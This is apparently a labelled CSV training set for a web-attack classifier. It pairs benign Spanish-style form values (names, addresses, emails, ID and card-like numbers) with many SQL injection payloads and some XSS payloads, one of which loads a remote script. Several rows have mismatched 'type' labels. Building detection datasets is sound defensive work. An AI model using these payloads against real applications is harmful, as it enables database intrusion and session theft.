Text,attack_type,Label,type
"1"" rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
1' and 6969=(select 6969 from pg_sleep(5)),sqli,1,sql
"cabanyes, les",norm,0,normal
"1 or 8421=(select count(*) from generate_series(1,5000000))-- xgyc",sqli,1,sql
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
"1%"") union all select null,null,null,null,null,null,null#",sqli,1,sql
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",sqli,1,sql
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",sqli,1,sql
"1 where 6434=6434;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
sada,norm,0,normal
"1"")) as swix where 2459=2459 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"-4318"") as vpvt where 5543=5543 union all select 5543,5543,5543,5543,5543,5543--",sqli,1,sql
"c/ manacor, s/n,",norm,0,normal
conde,norm,0,normal
berkhart@joyclub.mh,norm,0,normal
45654,norm,0,normal
<script src=http://vulnerability-lab.com/crosssitescripting.js></script>,xss,2,xss
brier,norm,0,normal
21700,norm,0,normal
glazer,norm,0,normal
gwendoline,norm,0,normal
caelles payas,norm,0,normal
"1'||(select 'adiv' from dual where 9842=9842 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",sqli,1,sql
paquito,norm,0,normal
leonelo,norm,0,normal
lupiana,norm,0,normal
21?i05r2,norm,0,normal
"c/ violetas 43, 3-a",norm,0,normal
clorosis,norm,0,normal
30097796l,norm,0,normal
4a8ar3nas,norm,0,normal
"1%"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""%""=""",sqli,1,sql
c/ almirante cervera 51 1?h,norm,0,normal
"1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#",sqli,1,sql
5586,norm,0,normal
coladiza,norm,0,normal
-9197') or (6877=8010)*8010 and ('umwl'='umwl,sqli,1,normal
"1 where 4331=4331 union all select null,null,null,null,null,null#",sqli,1,sql
c96reveidil5,norm,0,normal
"-5207"" where 2050=2050 union all select 2050,2050,2050,2050,2050,2050,2050--",sqli,1,sql
nafria mirambell,norm,0,normal
"1')) and elt(1210=1210,sleep(5)) and (('zizo' like 'zizo",sqli,1,normal
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,sqli,1,sql
vildo@prensahp.fj,norm,0,normal
9253,norm,0,normal
"1%"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",sqli,1,sql
"-9634'))) union all select 4141,4141#",sqli,1,sql
ronendra,norm,0,normal
"1%')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",sqli,1,sql
"1%'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",sqli,1,sql
catrielcelis,norm,0,normal
vznar,norm,0,normal
gnaeding,norm,0,normal
encrasar,norm,0,normal
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
1))) and (select * from (select(sleep(5)))fzno) and (((1601=1601,sqli,1,sql
"1'+(select 'sppw' where 1677=1677 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",sqli,1,sql
5osan$9a,norm,0,normal
-sobarbada,norm,0,normal
nugent,norm,0,normal
"1"")) as zbfj where 2285=2285;(select * from (select(sleep(5)))acdk)#",sqli,1,sql
"1"") where 2702=2702 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
"-5160') as kgjw where 9609=9609 union all select 9609,9609--",sqli,1,sql
weintraub,norm,0,normal
"1%""))) rlike (select * from (select(sleep(5)))sgvo) and (((""%""=""",sqli,1,sql
6542491827196676,norm,0,normal
riogordo,norm,0,normal
"1%') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='",sqli,1,sql
tegenes,norm,0,normal
sarcey-fendel@gesmahernan.de,norm,0,normal
68889499z,norm,0,normal
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,sqli,1,sql
0373623914765620,norm,0,normal
enviada,norm,0,normal
">""<img src=""jav ascript:document.cookie=true;"">",xss,2,sql
gere.pratsch-kaufmann@rubirubi.sj,norm,0,normal
51842682s,norm,0,normal
"1%' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and '%'='",sqli,1,sql
"1'+(select 'tzey' where 4491=4491 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)-- dtha",sqli,1,sql
3902,norm,0,normal
1'||(select 'ydvg' from dual where 7108=7108;select sleep(5)#,sqli,1,sql
montseny,norm,0,normal
0e8v88e,norm,0,normal
"1"")) as iubt where 8179=8179 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
4260479237625494,norm,0,normal
"fuenmayor, 130,",norm,0,normal
5936907680257741,norm,0,normal
6110,norm,0,normal
ventantonio4@adscrito.nu,norm,0,normal
roussel@santacruzdelvoto.ws,norm,0,normal
1';select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1'||(select 'kbvq' where 9279=9279 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",sqli,1,sql
sant quirze del valls,norm,0,normal
gil garca,norm,0,normal
9129793967568864,norm,0,normal
enenconcharse,norm,0,normal
1%');(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"-6122"") union all select 6578,6578--",sqli,1,sql
24830,norm,0,normal
lvega,norm,0,normal
38036492n,norm,0,normal
"-3737%"" union all select 4452,4452,4452#",sqli,1,sql
7332706873817194,norm,0,normal
4203,norm,0,normal
"-5755"" or 3581=7566",sqli,1,normal
1)));select (case when (3336=9781) then 3336 else 1/(select 0) end)--,sqli,1,sql
ibarrangelu,norm,0,normal
"-3226'||(select 'ykdw' where 2617=2617 union all select 2617,2617--",sqli,1,sql
"-4166%"") union all select 5190--",sqli,1,sql
"1"" where 4366=4366 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
2174818451824569,norm,0,normal
"1) as rnfb where 2405=2405 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('mizk'='mizk,sqli,1,sql
1') and (select * from (select(sleep(5)))fzno),sqli,1,sql
9755,norm,0,normal
orist,norm,0,normal
charlebois3@nanotecnologo.np,norm,0,normal
"1' where 1628=1628;iif(9342=6508,1,1/0)",sqli,1,sql
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",sqli,1,sql
1) as tngy where 8956=8956 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
smithdea,norm,0,normal
ad28rsari!a,norm,0,normal
1'))) and 7533=7533 and ((('suzd' like 'suzd,sqli,1,normal
costur,norm,0,normal
<script>alert('xss');</script>,xss,2,xss
33529,norm,0,normal
bo8iner4,norm,0,normal
"1%"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",sqli,1,sql
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""deeu"" like ""deeu",sqli,1,sql
"1)) as rbae where 2049=2049 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
599iad12a,norm,0,normal
"c/ rio cidacos, 13",norm,0,normal
octagonal,norm,0,normal
07819871d,norm,0,normal
3616118295208716,norm,0,normal
"-1644%' or make_set(9354=9354,7185) and '%'='",sqli,1,normal
stanger-kitabayashi7@gestionsoftware.th,norm,0,normal
1'));select (case when (9667=6212) then 9667 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
(select (case when (9066=5598) then 1 else 9066*(select 9066 from information_schema.character_sets) end)),sqli,1,sql
1%'))) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
"-2643%"" union all select 7779,7779--",sqli,1,sql
lapidificar,norm,0,normal
1));select case when 7717=7717 then 1 else null end--,sqli,1,sql
lindt38,norm,0,normal
1%'))) and 2006=2006,sqli,1,normal
"1)) as hrks where 7637=7637 or elt(6272=6272,sleep(5))--",sqli,1,sql
8,norm,0,normal
1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('ugrk'='ugrk,sqli,1,sql
men3pea,norm,0,normal
"1"")) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxnj"" like ""mxnj",sqli,1,sql
18995930t,norm,0,normal
denotativo,norm,0,normal
"1'+(select sfuq where 8094=8094 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'",sqli,1,sql
"1%"" and (2850=6610)*6610 and ""%""=""",sqli,1,normal
08363269d,norm,0,normal
5e011llo,norm,0,normal
calle juan valera 97 12d,norm,0,normal
dud,norm,0,normal
"c/ brazato, 132 2?g",norm,0,normal
"guzman de alfarache, 18,",norm,0,normal
villaviciosa de odn,norm,0,normal
coves de vinrom les,norm,0,normal
fidelio 5,norm,0,normal
"mourel 113, 4?a",norm,0,normal
-1886' where 5518=5518 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
"-4543"") or 3038=3038",sqli,1,normal
1'+(select lqhd where 4251=4251 and (8754=5779)*5779)+',sqli,1,sql
descostill3r,norm,0,normal
agen,norm,0,normal
tropeano3,norm,0,normal
gladiolos 30,norm,0,normal
"-9037%"" union all select 6583#",sqli,1,sql
janda,norm,0,normal
petronil,norm,0,normal
"calle toronja, 157",norm,0,normal
"1',(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4932=4932) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",sqli,1,sql
15lo956i1o,norm,0,normal
"1));select count(*) from generate_series(1,5000000)--",sqli,1,sql
"calle alfayatas, 37,",norm,0,normal
"jose incenga 14,",norm,0,normal
"monte campamento 169,",norm,0,normal
"praza francisco fernandez del riego, 131",norm,0,normal
mud6787t6,norm,0,normal
sineiro herranz,norm,0,normal
01116944h,norm,0,normal
"1"") where 9223=9223 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
mohedas de granadilla,norm,0,normal
16157298m,norm,0,normal
doralie,norm,0,normal
80135646n,norm,0,normal
"1))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
plazuela tejares 132,norm,0,normal
"-2033"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"-2111' union all select 1061,1061,1061--",sqli,1,sql
"callejon giron 124,",norm,0,normal
neceta,norm,0,normal
casarabonela,norm,0,normal
65,norm,0,normal
"1%""))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
61225121h,norm,0,normal
"-7794"") union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",sqli,1,sql
richarde@zarahealth.bz,norm,0,normal
7492,norm,0,normal
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""hvwv""=""hvwv",sqli,1,sql
8020,norm,0,normal
"1'||(select 'hwdj' where 8179=8179;iif(3447=1084,1,1/0)",sqli,1,sql
"1"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""hbgv""=""hbgv",sqli,1,sql
16124624z,norm,0,normal
9817,norm,0,normal
"passeig de monjo 102, 11?a",norm,0,normal
3471,norm,0,normal
martn del ro,norm,0,normal
"-6846%"")) or (8459=8459)*4906 and ((""%""=""",sqli,1,normal
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--",sqli,1,sql
"1 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
cibeles,norm,0,normal
"1))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((4127=4127",sqli,1,sql
scoccia,norm,0,normal
1'+(select wgmn where 4368=4368 and 7859=6151)+',sqli,1,sql
"1'||(select 'sbft' where 8748=8748;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"-7306"" or 2081=6847",sqli,1,normal
yount,norm,0,normal
skylar,norm,0,normal
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm",sqli,1,sql
"<br size=""&{document.cookie=true}"">",xss,2,normal
"-1490'||(select 'uzbm' from dual where 3181=3181 union all select 3181,3181,3181,3181,3181--",sqli,1,sql
1)) as sfan where 7176=7176 and 7017=7358,sqli,1,normal
iara,norm,0,normal
1'+(select twyt where 3376=3376 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',sqli,1,sql
melchior@fruteriacartaya.vi,norm,0,normal
tribaldos,norm,0,normal
muzas,norm,0,normal
"-2254') as dyrv where 9079=9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",sqli,1,sql
"-5300' union all select 2750,2750,2750,2750,2750,2750--",sqli,1,sql
*aquele,norm,0,normal
8505,norm,0,normal
domeable,norm,0,normal
"1')) and elt(4249=4249,7259) and (('miir' like 'miir",sqli,1,normal
5107,norm,0,normal
calle de joan miro s/n,norm,0,normal
arruga4,norm,0,normal
sobaquera,norm,0,normal
bennasar,norm,0,normal
pulsmetro,norm,0,normal
9008082484622624,norm,0,normal
80788346h,norm,0,normal
"calle estrella naos, 155",norm,0,normal
"etorbidea atarrabiako 126, 5d",norm,0,normal
casas de miravete,norm,0,normal
03134,norm,0,normal
cinca toscano,norm,0,normal
66129193f,norm,0,normal
"1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",sqli,1,sql
peimel,norm,0,normal
"1) as nkjo where 8462=8462 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('wmrr' like 'wmrr",sqli,1,sql
"romana, la",norm,0,normal
andee,norm,0,normal
364,norm,0,normal
50830,norm,0,normal
kin-yee,norm,0,normal
bardallur,norm,0,normal
"c/ el perellonet 5,",norm,0,normal
"1"" where 7290=7290 union all select null,null,null,null,null,null,null--",sqli,1,sql
"-3461"")) union all select 6342,6342,6342,6342,6342,6342#",sqli,1,sql
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""lsvg"" like ""lsvg",sqli,1,sql
1' in boolean mode);select (case when (4306=2815) then 4306 else 1/(select 0) end)--,sqli,1,sql
teruel,norm,0,normal
"1')) as ticp where 9794=9794 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
pl. santiago apostol 79 10-f,norm,0,normal
"1') as ibqr where 5372=5372 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
ubraco,norm,0,normal
chunshin,norm,0,normal
urette@elcarritodelacompra.ch,norm,0,normal
garmes,norm,0,normal
calle matias ramon martinez martinez 30,norm,0,normal
kollmannsberger@921.in,norm,0,normal
"-9845"") as xpis where 1936=1936 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
-2432')) or (8459=8459)*4906 and (('ejhp'='ejhp,sqli,1,normal
lao,norm,0,normal
lebars,norm,0,normal
binaced,norm,0,normal
"c/ gaspar reyes, 172 8?f",norm,0,normal
lijphart,norm,0,normal
"1"")) as riui where 2605=2605;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"-9445) as dmur where 4371=4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",sqli,1,sql
"1') as sagj where 4558=4558;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1';iif(5257=5257,1,1/0)",sqli,1,sql
calle rascon 144,norm,0,normal
banda garitacelaya,norm,0,normal
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",sqli,1,sql
ridgely.loyat@cbgerindote.sk,norm,0,normal
1'||(select 'vasx' where 4770=4770 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||',sqli,1,sql
empa.etar,norm,0,normal
1')));begin dbms_lock.sleep(5); end and ((('xzbk'='xzbk,sqli,1,sql
roni,norm,0,normal
desnudez,norm,0,normal
"</title><script>alert(""xss"");</script>",xss,2,xss
7178886603205513,norm,0,normal
sabanaya4,norm,0,normal
"poblets, els",norm,0,normal
furet@sanchezquesada.lc,norm,0,normal
telde,norm,0,normal
16582,norm,0,normal
rtova,norm,0,normal
aldeamayor de san martn,norm,0,normal
1'||(select 'sdll' where 5074=5074 or (select * from (select(sleep(5)))ydpu))||',sqli,1,sql
"-4825%') union all select 6804,6804,6804,6804,6804,6804,6804--",sqli,1,sql
8647634867681270,norm,0,normal
ann-mari,norm,0,normal
1'||(select 'xugb' from dual where 6772=6772;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"1"" where 7279=7279 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"-7845' union all select 9574,9574,9574,9574,9574,9574#",sqli,1,sql
caete,norm,0,normal
carroll,norm,0,normal
-2679'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cutk' like 'cutk,sqli,1,sql
"1'))) and elt(4249=4249,7259) and ((('ujcx'='ujcx",sqli,1,normal
joya,norm,0,normal
"1%"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
31650,norm,0,normal
"-6359"")) or elt(3546=2433,2433) and ((""qxat""=""qxat",sqli,1,normal
p4rtapaz,norm,0,normal
1' where 5035=5035 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",sqli,1,sql
"1)) as hgtl where 3864=3864 and elt(3114=3114,sleep(5))#",sqli,1,normal
32790960k,norm,0,normal
morfea,norm,0,normal
"1' in boolean mode)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))#",sqli,1,sql
01120,norm,0,normal
beato,norm,0,normal
fowley5@virginislands.com.eg,norm,0,normal
(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual),sqli,1,sql
"1%'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1) as czeu where 1738=1738 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
"1)) union all select null,null,null,null--",sqli,1,sql
laflamme6,norm,0,normal
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"-9896""))) union all select 4073,4073,4073,4073,4073#",sqli,1,sql
2783,norm,0,normal
pospalatal,norm,0,normal
"1) as qwsa where 2874=2874;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
6180,norm,0,normal
cetraro,norm,0,normal
rickie,norm,0,normal
abraham,norm,0,normal
14638777j,norm,0,normal
"1%""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",sqli,1,sql
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",sqli,1,sql
08tiro72,norm,0,normal
12306474w,norm,0,normal
moston@sierradealcaraz.sg,norm,0,normal
"1)) as ynzg where 1926=1926 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"plaa catalunya 124, 5-b",norm,0,normal
"1%""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""%""=""",sqli,1,sql
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
neleo,norm,0,normal
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
7798282598558124,norm,0,normal
